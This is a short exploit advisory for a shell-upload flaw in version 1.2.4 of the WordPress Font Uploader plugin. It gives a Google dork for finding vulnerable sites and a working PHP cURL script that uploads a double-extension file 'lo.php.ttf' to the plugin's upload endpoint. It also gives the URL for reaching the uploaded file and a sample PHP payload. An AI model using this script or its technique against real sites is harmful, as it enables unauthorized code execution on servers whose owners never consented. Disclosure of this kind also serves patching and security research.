##################################################
# Description : Wordpress Plugins - WordPress Font Uploader Shell Upload
Vulnerability
# Version : 1.2.4
# Link : http://wordpress.org/extend/plugins/font-uploader/
# Plugins : http://downloads.wordpress.org/plugin/font-uploader.1.2.4.zip
# Date : 01-06-2012
# Google Dork : inurl:/wp-content/plugins/font-uploader/
# Author : Sammy FORGIT - sam at opensyscom dot fr -
http://www.opensyscom.fr
##################################################


Exploit :

PostShell.php
<?php

$uploadfile="lo.php.ttf";
$ch =
curl_init("http://server/wordpress/wp-content/plugins/font-uploader/font-upload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('font'=>"@$uploadfile",
'Submit'=>'submit'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access :
http://www.exemple.com/wordpress/wp-content/plugins/font-uploader/fonts/lo.php.ttf

lo.php.ttf
<?php
phpinfo();
?>